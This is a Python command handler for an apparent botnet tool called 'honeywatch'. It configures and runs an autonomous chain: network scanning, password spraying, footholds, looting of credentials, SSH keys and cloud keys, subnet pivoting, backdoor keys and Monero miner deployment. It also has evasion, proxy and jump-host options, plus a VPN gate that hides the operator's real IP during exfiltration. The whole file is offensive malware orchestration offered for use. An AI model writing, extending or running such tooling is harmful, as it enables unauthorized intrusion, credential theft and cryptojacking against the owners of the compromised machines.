"""`honeywatch botnet` command handler — runs the autonomous chain."""

from __future__ import annotations

import sqlite3
import sys


def _build_botnet_config(args):
    """Build the chain config from CLI args, defaulting the Monero wallet/pool/
    worker/TLS from the ``honeywatch setup`` store when the flags are absent.

    Extracted from ``_cmd_botnet`` so the setup-default wiring is unit-testable
    without running the (network-bound) chain. Explicit flags always win.
    """
    from honeywatch.agent.setup import SetupStore
    from honeywatch.chain import ChainConfig

    db_path = args.db or "honeywatch.db"
    # The wallet + pool are configured once during `honeywatch setup` and
    # persisted in the agent_setup store. Use them as defaults here so the chain
    # runs with just `honeywatch botnet 10.0.0.0/24` after setup, instead of
    # re-passing --pool/--wallet every time. A corrupt/unreadable setup store
    # degrades to empty defaults but warns so the operator knows the setup
    # values were lost (rather than silently aborting phase_persist later with
    # a confusing "ABORT: miner deploy needs --pool, --wallet").
    try:
        setup_cfg = SetupStore(db_path).load_config()
    except (OSError, sqlite3.Error) as exc:
        print(f"honeywatch botnet: warning: could not read setup store at "
              f"{db_path!r}: {exc}; wallet/pool defaults are empty",
              file=sys.stderr)
        setup_cfg = None
    _pool = setup_cfg.pool if setup_cfg else ""
    _wallet = setup_cfg.wallet if setup_cfg else ""
    _worker = setup_cfg.worker if setup_cfg else ""
    _tls = setup_cfg.tls if setup_cfg else False

    return ChainConfig(
        targets=list(args.targets or []),
        scan_tool=args.scan_tool,
        scan_rate=args.scan_rate,
        max_hosts=args.max_hosts,
        users=[u.strip() for u in args.users.split(",") if u.strip()] if args.users else [],
        user_file=args.user_file,
        passwords=[p.strip() for p in args.passwords.split(",") if p.strip()] if args.passwords else [],
        password_file=args.password_file,
        payload_id=args.payload,
        pool=args.pool or _pool,
        wallet=args.wallet or _wallet,
        worker=args.worker or _worker or "honeywatch",
        threads=args.threads,
        tls=args.tls or _tls,
        evasion=[e.strip() for e in args.evasion.split(",") if e.strip()] if args.evasion else [],
        hashcrack_wordlist=args.hashcrack_wordlist or "",
        hashcrack_tool=args.hashcrack_tool,
        business_hours=args.business_hours,
        proxy_file=args.proxy_file,
        jump_file=args.jump_file,
        delay=args.delay,
        jitter=args.jitter,
        lockout_delay=args.lockout_delay,
        host_concurrency=args.host_concurrency,
        min_confidence=args.min_confidence,
        max_rounds=args.max_rounds,
        backdoor_key=args.backdoor_key or "",
        skip_vpn_check=args.skip_vpn_check,
        db_path=db_path,
        shadow_stash=args.shadow_stash,
        config_path=args.config,
    )


def _cmd_botnet(args, argv) -> int:
    from honeywatch.chain import ChainPhase, run_chain
    from honeywatch.store import Store

    cfg = _build_botnet_config(args)

    # VPN gate at the CLI boundary. Every other network subcommand (scan,
    # probe, crack, spray, grab, deploy) calls _enforce_vpn(); the botnet
    # chain runs the same network phases (spray, foothold, loot, pivot) and
    # must be gated the same way. Without this, a `--skip-vpn-check` run (or a
    # stored-hosts-only run that skips recon's internal gate) exfiltrates
    # from the operator's real IP.
    from honeywatch.cli import _enforce_vpn
    from honeywatch.config import load_config

    if not _enforce_vpn(load_config(args.config), args.skip_vpn_check):
        return 2

    # If no targets were given and the store has no hosts either, the chain
    # will loop through all phases doing nothing. Fail early with a clear hint.
    if not cfg.targets:
        try:
            store = Store(cfg.db_path)
            known = store.scored_hosts()
        except Exception:
            known = set()
        if not known:
            print("honeywatch botnet: no targets specified and no stored hosts found.\n"
                  "  Pass target IPs/ranges as arguments, or run a scan first "
                  "to populate the store.", file=sys.stderr)
            return 1

    def on_phase(phase: ChainPhase, msg: str, state, **extra):
        if not args.json:
            print(f"[chain r{state.round}/{phase.value}] {msg}", flush=True)

    state = run_chain(cfg, on_phase=on_phase)

    if args.json:
        import json as _json
        print(_json.dumps({
            "rounds": state.round,
            "hosts": len(state.hosts),
            "sprayable": len(state.sprayable),
            "credentials": len(state.credentials),
            "footholds": len(state.footholds),
            "enqueued": len(state.enqueued),
            "pivoted": len(state.pivoted_subnets),
            "looted": len(state.looted_footholds),
            "cloud_creds": len(state.cloud_creds),
            "recovered_ssh_keys": len(state.recovered_ssh_keys),
            "stopped": state.stopped,
            "stop_reason": state.stop_reason,
            "log": state.log,
        }, indent=2, default=str))
        return 0

    print("\nbotnet chain summary")
    print("  rounds:      " + str(state.round))
    print("  hosts:       " + str(len(state.hosts)))
    print("  sprayable:   " + str(len(state.sprayable)))
    print("  credentials: " + str(len(state.credentials)))
    print("  footholds:   " + str(len(state.footholds)))
    print("  enqueued:    " + str(len(state.enqueued)))
    print("  pivoted:     " + str(len(state.pivoted_subnets)))
    print("  looted:      " + str(len(state.looted_footholds)))
    print("  cloud creds: " + str(len(state.cloud_creds)))
    print("  ssh keys:    " + str(len(state.recovered_ssh_keys)))
    print("  status:      " + (state.stop_reason or "running"))
    if state.footholds:
        print("\nfootholds:")
        for ip, port, user, _pw in state.footholds:
            print("  " + ip + ":" + str(port) + "  " + user)
    return 0